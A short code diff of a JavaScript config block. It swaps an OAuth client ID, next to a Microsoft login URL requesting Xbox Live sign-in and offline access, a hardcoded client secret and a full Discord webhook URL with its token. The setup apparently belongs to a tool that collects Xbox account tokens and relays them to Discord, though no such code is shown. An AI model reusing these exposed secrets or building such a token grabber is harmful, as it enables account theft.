@@ -1,7 +1,7 @@
 //https://login.live.com/oauth20_authorize.srf?client_id=af87e0d4-5d31-4eb9-bee8-094adf912e3b&response_type=code&redirect_uri=https://github.com/ELIPROSTER/discord-bot&scope=XboxLive.signin+offline_access&state=NOT_NEEDED
 //Config
 const client_secret = '2ff810c3-6c8e-441e-886f-1ccd88958132'
-const client_id = 'af87e0d4-5d31-4eb9-bee8-094adf912e3b'
+const client_id = '025ecefb-36ea-40fe-ae37-da8637fb08c1'
 const redirect_uri = 'https://github.com/ELIPROSTER/discord-bot'
 const webhook_url = 'https://discord.com/api/webhooks/1523161252757504020/no7Nl70vlgASXjzkOQRD8wegd3xXxWi3lBbHNgjTviTmQKWfSJVpRr0Cjj6whItwN3ns'
 //Requirements
